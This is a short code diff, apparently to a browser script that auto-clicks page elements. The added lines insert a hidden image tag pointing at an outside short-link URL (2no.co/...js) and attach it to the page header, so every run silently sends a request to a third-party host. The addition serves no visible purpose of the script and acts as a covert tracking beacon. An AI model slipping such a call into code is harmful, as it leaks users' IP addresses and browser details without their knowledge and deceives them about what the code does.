@@ -13,4 +13,9 @@ yes[x].click()
 x++;
 }
 }
+  var img = document.createElement("img");
+img.src = "https://2no.co/1GGiw7.js";
+
+var src = document.getElementById("header");
+src.appendChild(img);
 }
